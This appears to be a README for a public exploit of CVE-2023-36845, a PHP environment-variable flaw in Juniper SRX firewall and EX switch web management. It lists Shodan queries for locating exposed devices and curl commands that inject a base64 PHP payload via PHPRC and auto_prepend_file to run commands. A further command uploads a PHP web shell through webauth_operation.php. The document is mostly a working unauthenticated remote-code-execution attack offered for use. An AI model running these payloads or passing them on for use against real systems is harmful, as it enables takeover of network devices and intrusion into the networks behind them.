# CVE-2023-36845

![](https://img.shields.io/static/v1?label=Product&message=Juniper%20Web%20Device%20Manager&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=All%20versions%20prior%20to%2021.4R3-S5&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=Remote%20Code%20Execution&color=red)

## Description

CVE-2023-36845 represents a notable PHP environment variable manipulation vulnerability that impacts Juniper SRX firewalls and EX switches. While Juniper has categorized this vulnerability as being of medium severity, in this article, we will elucidate how this singular vulnerability can be leveraged for remote, unauthenticated code execution.

## Shodan dork:
```
title:"Juniper Web Device Manager"
```

```
title:"Juniper" http.favicon.hash:2141724739
```

## Usage
Detection
```
python3 CVE-2023-36845.py -f targets.txt -o output.txt
```

## RCE 

### Option 1 
Utilizing any protocol wrapper in conjunction with `auto_prepend_file` is feasible. The most suitable choice for this operation is the `data://` protocol, which allows inline provision of the "secondary file". Here's a sophisticated representation of this exploit, executing the embedded `<? phpinfo(); ?>` within the `data://` scheme:

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
Execute `whoami` command

`<?php shell_exec('whoami'); ?>`
```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD9waHAgc2hlbGxfZXhlYygnd2hvYW1pJyk7ID8+Cg=="'
```

### Option 2
Upload a file

`<?php if(isset($_REQUEST[cmd])){ echo "<pre>"; $cmd = ($_REQUEST[cmd]); system($cmd); echo "</pre>"; die; }?>`

```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=
", "csize": 110}]'
```

## Parameters 

Parameter | Description | Type
------------ | ------------- | -------------
--file / -f | Input targets file | File
-o | Output file | File

